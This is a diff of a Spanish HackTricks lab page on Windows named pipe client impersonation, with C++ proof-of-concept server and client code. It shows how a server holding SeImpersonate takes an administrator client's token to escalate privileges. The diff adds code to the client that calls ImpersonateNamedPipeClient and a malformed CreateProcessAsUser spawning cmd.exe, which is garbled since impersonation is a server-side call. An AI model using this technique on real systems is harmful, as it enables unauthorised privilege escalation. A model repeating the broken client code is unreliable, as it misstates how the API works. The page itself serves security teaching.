@@ -1,6 +1,4 @@
-# Impersonación de Cliente de Tubería con Nombre
-
-## Impersonación de Cliente de Tubería con Nombre
+## Impersonación de cliente de tubería con nombre
 
 <details>
 
@@ -8,7 +6,7 @@
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
@@ -20,14 +18,14 @@
 
 Una `tubería` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.
 
-`Tuberías con nombre` es un mecanismo de Windows que permite a dos procesos no relacionados intercambiar datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor, ya que existen nociones como `un servidor de tubería con nombre` y un `cliente de tubería con nombre`.
+Las `tuberías con nombre` son un mecanismo de Windows que permite que dos procesos no relacionados intercambien datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor, ya que existen nociones como `un servidor de tubería con nombre` y un `cliente de tubería con nombre`.
 
 Un servidor de tubería con nombre puede abrir una tubería con nombre con un nombre predefinido y luego un cliente de tubería con nombre puede conectarse a esa tubería a través del nombre conocido. Una vez establecida la conexión, puede comenzar el intercambio de datos.
 
 Este laboratorio se refiere a un código PoC simple que permite:
 
 * crear un servidor de tubería con nombre tonto de un solo subproceso que aceptará una conexión de cliente
-* servidor de tubería con nombre para escribir un mensaje simple en la tubería con nombre para que el cliente de la tubería pueda leerlo
+* que el servidor de tubería con nombre escriba un mensaje simple en la tubería con nombre para que el cliente de la tubería pueda leerlo
 
 ## Código
 
@@ -71,6 +69,10 @@ int main() {
 
 {% tab title="namedPipeClient.cpp" %}
 
+# Named Pipe Client Impersonation
+
+Este código muestra cómo un cliente puede conectarse a un servidor de tuberías con nombre y luego usar la función `ImpersonateNamedPipeClient` para obtener el token de seguridad del cliente y ejecutar un comando con los permisos del cliente.
+
 ```cpp
 #include <windows.h>
 #include <stdio.h>
@@ -90,7 +92,7 @@ int _tmain(int argc, TCHAR *argv[])
    if( argc > 1 )
       lpvMessage = argv[1];
 
-   // Try to open a named pipe; wait for it, if necessary.
+// Try to open a named pipe; wait for it, if necessary.
 
    while (1)
    {
@@ -104,7 +106,7 @@ int _tmain(int argc, TCHAR *argv[])
          0,              // default attributes
          NULL);          // no template file
 
-      // Break if the pipe handle is valid.
+   // Break if the pipe handle is valid.
 
       if (hPipe != INVALID_HANDLE_VALUE)
          break;
@@ -126,7 +128,7 @@ int _tmain(int argc, TCHAR *argv[])
       }
    }
 
-   // The pipe connected; change to message-read mode.
+// The pipe connected; change to message-read mode.
 
    dwMode = PIPE_READMODE_MESSAGE;
    fSuccess = SetNamedPipeHandleState(
@@ -141,7 +143,7 @@ int _tmain(int argc, TCHAR *argv[])
       return -1;
    }
 
-   // Send a message to the pipe server.
+// Send a message to the pipe server.
 
    cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
    _tprintf( TEXT("Sending %d byte message: \"%s\"\n"), cbToWrite, lpvMessage);
@@ -163,7 +165,7 @@ int _tmain(int argc, TCHAR *argv[])
 
    do
    {
-      // Read from the pipe.
+   // Read from the pipe.
 
       fSuccess = ReadFile(
          hPipe,    // pipe handle
@@ -184,8 +186,32 @@ int _tmain(int argc, TCHAR *argv[])
       return -1;
    }
 
-   _tprintf( TEXT("\n<End of message, press ENTER to terminate connection and exit>") );
+   printf("\n<End of message, press ENTER to terminate connection and exit>");
    _getch();
+
+// Impersonate the named pipe client.
+
+   if (!ImpersonateNamedPipeClient(hPipe))
+   {
+      _tprintf( TEXT("ImpersonateNamedPipeClient failed. GLE=%d\n"), GetLastError() );
+      return -1;
+   }
+
+// Execute a command as the named pipe client.
+
+   if (!CreateProcessAsUser(NULL, _T("C:\\Windows\\System32\\cmd.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL))
+   {
+      _tprintf( TEXT("CreateProcessAsUser failed. GLE=%d\n"), GetLastError() );
+      return -1;
+   }
+
+// Stop impersonating the named pipe client.
+
+   if (!RevertToSelf())
+   {
+      _tprintf( TEXT("RevertToSelf failed. GLE=%d\n"), GetLastError() );
+      return -1;
+   }
 
    CloseHandle(hPipe);
 
@@ -193,133 +219,7 @@ int _tmain(int argc, TCHAR *argv[])
 }
 ```
 
-{% endtab %}
-
-{% tab title="namedPipeClient.cpp" %}
-
-```cpp
-#include <windows.h>
-#include <stdio.h>
-#include <tchar.h>
-
-#define BUFSIZE 512
-
-int _tmain(int argc, TCHAR *argv[])
-{
-   HANDLE hPipe;
-   LPTSTR lpvMessage=TEXT("Mensaje predeterminado del cliente.");
-   TCHAR chBuf[BUFSIZE];
-   BOOL fSuccess = FALSE;
-   DWORD cbRead, cbToWrite, cbWritten, dwMode;
-   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");
-
-   if( argc > 1 )
-      lpvMessage = argv[1];
-
-   // Intenta abrir un named pipe; espera si es necesario.
-
-   while (1)
-   {
-      hPipe = CreateFile(
-         lpszPipename,   // nombre del pipe
-         GENERIC_READ |  // acceso de lectura y escritura
-         GENERIC_WRITE,
-         0,              // sin compartir
-         NULL,           // atributos de seguridad predeterminados
-         OPEN_EXISTING,  // abre el pipe existente
-         0,              // atributos predeterminados
-         NULL);          // sin archivo de plantilla
-
-      // Rompe si el handle del pipe es válido.
-
-      if (hPipe != INVALID_HANDLE_VALUE)
-         break;
-
-      // Salir si ocurre un error que no sea ERROR_PIPE_BUSY.
-
-      if (GetLastError() != ERROR_PIPE_BUSY)
-      {
-         _tprintf( TEXT("No se pudo abrir el pipe. GLE=%d\n"), GetLastError() );
-         return -1;
-      }
-
-      // Todas las instancias del pipe están ocupadas, así que espera 20 segundos.
-
-      if ( ! WaitNamedPipe(lpszPipename, 20000))
-      {
-         printf("No se pudo abrir el pipe: tiempo de espera de 20 segundos agotado.");
-         return -1;
-      }
-   }
-
-   // El pipe se conectó; cambia al modo de lectura de mensajes.
-
-   dwMode = PIPE_READMODE_MESSAGE;
-   fSuccess = SetNamedPipeHandleState(
-      hPipe,    // handle del pipe
-      &dwMode,  // nuevo modo de pipe
-      NULL,     // no establecer bytes máximos
-      NULL);    // no establecer tiempo máximo
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("SetNamedPipeHandleState falló. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   // Envía un mensaje al servidor de pipe.
-
-   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
-   _tprintf( TEXT("Enviando mensaje de %d bytes: \"%s\"\n"), cbToWrite, lpvMessage);
-
-   fSuccess = WriteFile(
-      hPipe,                  // handle del pipe
-      lpvMessage,             // mensaje
-      cbToWrite,              // longitud del mensaje
-      &cbWritten,             // bytes escritos
-      NULL);                  // no superpuesto
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("WriteFile al pipe falló. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   printf("\nMensaje enviado al servidor, recibiendo respuesta como sigue:\n");
-
-   do
-   {
-      // Lee del pipe.
-
-      fSuccess = ReadFile(
-         hPipe,    // handle del pipe
-         chBuf,    // búfer para recibir respuesta
-         BUFSIZE*sizeof(TCHAR),  // tamaño del búfer
-         &cbRead,  // número de bytes leídos
-         NULL);    // no superpuesto
-
-      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
-         break;
-
-      _tprintf( TEXT("\"%s\"\n"), chBuf );
-   } while ( ! fSuccess);  // repite el bucle si ERROR_MORE_DATA
-
-   if ( ! fSuccess)
-   {
-      _tprintf( TEXT("ReadFile del pipe falló. GLE=%d\n"), GetLastError() );
-      return -1;
-   }
-
-   _tprintf( TEXT("\n<Fin del mensaje, presione ENTER para terminar la conexión y salir>") );
-   _getch();
-
-   CloseHandle(hPipe);
-
-   return 0;
-}
-```
-
-{% endtab %}
+</details>
 ```cpp
 #include "pch.h"
 #include <iostream>
@@ -376,12 +276,12 @@ Incluso podemos ver nuestro pipe con powershell:
 ## Impersonación de Token
 
 {% hint style="info" %}
-Tenga en cuenta que para poder suplantar el token del proceso del cliente, es necesario que el proceso del servidor que crea la tubería tenga el privilegio de token **`SeImpersonate`**.
+Tenga en cuenta que para suplantar el token del proceso del cliente, es necesario que el proceso del servidor que crea la tubería tenga el privilegio de token **`SeImpersonate`**
 {% endhint %}
 
-Es posible que el servidor de la tubería con nombre suplante el contexto de seguridad del cliente de la tubería con nombre mediante una llamada de API `ImpersonateNamedPipeClient`, lo que a su vez cambia el token del subproceso actual del servidor de la tubería con nombre por el token del cliente de la tubería con nombre.
+Es posible que el servidor de la tubería con nombre suplante el contexto de seguridad del cliente de la tubería con nombre aprovechando una llamada de API `ImpersonateNamedPipeClient`, que a su vez cambia el token del subproceso actual del servidor de la tubería con nombre con el token del cliente de la tubería con nombre.
 
-Podemos actualizar el código del servidor de la tubería con nombre de esta manera para lograr la suplantación, tenga en cuenta que las modificaciones se ven en la línea 25 y siguientes:
+Podemos actualizar el código del servidor de la tubería con nombre de esta manera para lograr la suplantación - tenga en cuenta que las modificaciones se ven en la línea 25 y siguientes:
 ```cpp
 int main() {
 	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
@@ -420,4 +320,4 @@ int main() {
 	return 0;
 }
 ```
-Al ejecutar el servidor y conectarse a él con el cliente que se está ejecutando bajo el contexto de seguridad administrator@offense.local, podemos ver que el hilo principal del servidor de tuberías con nombre asumió el token del cliente de la tubería con nombre - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?
+Al ejecutar el servidor y conectarse a él con el cliente que se está ejecutando bajo el contexto de seguridad de administrador@offense.local, podemos ver que el hilo principal del named server pipe asumió el token del cliente de named pipe - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad de ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?
